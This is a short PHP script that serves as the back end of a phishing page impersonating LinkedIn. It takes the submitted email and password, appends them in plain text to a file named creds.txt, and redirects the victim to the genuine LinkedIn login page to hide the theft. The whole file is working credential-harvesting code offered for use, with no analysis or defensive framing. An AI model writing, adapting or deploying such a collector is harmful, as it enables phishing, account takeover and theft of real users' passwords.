<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Correct field names from your form:
    $email = isset($_POST['email']) ? $_POST['email'] : 'No Email';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : 'No Password';

    // Save the credentials to creds.txt
    $data = "Email: " . $email . "\nPassword: " . $pass . "\n----------------------\n";
    file_put_contents('creds.txt', $data, FILE_APPEND);

    // Redirect to the real LinkedIn login page
    header('Location: https://www.linkedin.com/login');
    exit();
}
?>

